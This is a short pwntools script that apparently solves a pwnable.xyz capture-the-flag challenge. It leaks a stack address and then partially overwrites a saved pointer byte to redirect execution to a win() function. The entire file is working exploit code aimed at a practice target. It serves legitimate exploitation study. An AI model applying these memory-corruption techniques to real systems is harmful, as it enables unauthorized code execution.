from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30012)

sla = r.sendlineafter
sa = r.sendafter


# stack leak

sla('> ', '3')

r.recvuntil('0x')
rbp = int(r.recvline()[:-1], 16) - 0xf8 # rbp of main()
log.info('rbp of main(): ' + hex(rbp))


# jump to win()

sa('> ', str(0x7b).ljust(0x20, 'A') + chr((rbp & 0xff) + 0x9))
sa('> ', str(1).ljust(0x20, 'A') + chr(rbp & 0xff))


r.interactive()